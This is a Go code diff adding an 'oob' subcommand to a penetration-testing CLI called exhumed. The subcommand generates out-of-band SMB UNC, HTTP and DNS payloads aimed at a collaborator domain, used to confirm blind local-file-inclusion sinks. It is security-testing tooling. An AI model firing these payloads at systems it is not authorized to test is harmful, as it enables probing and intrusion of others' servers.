@@ -1,8 +1,10 @@
 package cli
 
 import (
+	"encoding/json"
 	"fmt"
 
+	"github.com/bugsyhewitt/exhumed/internal/oob"
 	"github.com/bugsyhewitt/exhumed/internal/phpfilter"
 	"github.com/spf13/cobra"
 )
@@ -16,6 +18,82 @@ func newPayloadCmd() *cobra.Command {
 		Short: "Generate exploitation payloads (e.g. PHP filter chains for RCE escalation)",
 	}
 	cmd.AddCommand(newPHPFilterCmd())
+	cmd.AddCommand(newOOBCmd())
+	return cmd
+}
+
+func newOOBCmd() *cobra.Command {
+	var (
+		domain string
+		share  string
+		path   string
+		label  bool
+		asJSON bool
+	)
+
+	cmd := &cobra.Command{
+		Use:   "oob",
+		Short: "Generate out-of-band payloads to confirm blind LFI sinks via an interaction callback",
+		Long: `oob generates out-of-band (OOB) payloads for confirming BLIND LFI / path-traversal
+sinks — vulnerabilities where the target reads or include()s a file but never
+reflects its contents in the HTTP response, so exhumed's body-pattern detection
+sees nothing.
+
+Each payload forces the target to make an outbound interaction (DNS, SMB, or
+HTTP) to a collaborator domain you control. Observing that interaction at your
+collaborator (interactsh, Burp Collaborator, a controlled DNS/HTTP log) proves
+the sink fired even with an empty response.
+
+exhumed only GENERATES the payloads; it runs no listener and makes no network
+calls. You place each string into the vulnerable parameter and correlate hits
+out-of-band yourself. (Automated listener/correlation is a planned follow-on.)
+
+Techniques emitted, most to least reliable:
+  smb-unc       \\<domain>\<share>   — Windows include()/file APIs (SMB+DNS)
+  http-wrapper  http://<domain>/...  — allow_url_include / URL-fetching sinks
+  https-wrapper https://<domain>/... — TLS-only egress
+  dns-resolve   \\<domain>\          — DNS lookup only (survives strict egress)
+
+Examples:
+  exhumed payload oob --domain abc123.oast.fun
+  exhumed payload oob --domain abc123.oast.fun --label --json
+  exhumed payload oob --domain x.burpcollaborator.net --share data --path beacon
+
+LEGAL NOTICE: authorized testing only.`,
+		RunE: func(cmd *cobra.Command, args []string) error {
+			payloads, err := oob.Generate(oob.Options{
+				Domain: domain,
+				Share:  share,
+				Path:   path,
+				Label:  label,
+			})
+			if err != nil {
+				return fmt.Errorf("generate oob payloads: %w", err)
+			}
+
+			out := cmd.OutOrStdout()
+			if asJSON {
+				enc := json.NewEncoder(out)
+				enc.SetIndent("", "  ")
+				if err := enc.Encode(payloads); err != nil {
+					return fmt.Errorf("encode json: %w", err)
+				}
+				return nil
+			}
+
+			for _, p := range payloads {
+				fmt.Fprintf(out, "%-14s %s\n", p.Technique, p.Value)
+			}
+			return nil
+		},
+	}
+
+	cmd.Flags().StringVar(&domain, "domain", "", "collaborator domain you control (required; bare domain, no scheme/path)")
+	cmd.Flags().StringVar(&share, "share", "", "SMB share name for UNC payloads (default \"exhumed\")")
+	cmd.Flags().StringVar(&path, "path", "", "resource path for http(s) wrapper payloads (default \"exhumed-oob\")")
+	cmd.Flags().BoolVar(&label, "label", false, "prepend a per-technique subdomain label so interactions can be attributed by technique")
+	cmd.Flags().BoolVar(&asJSON, "json", false, "emit payloads as JSON (value, technique, subdomain, note)")
+	_ = cmd.MarkFlagRequired("domain")
 	return cmd
 }
 
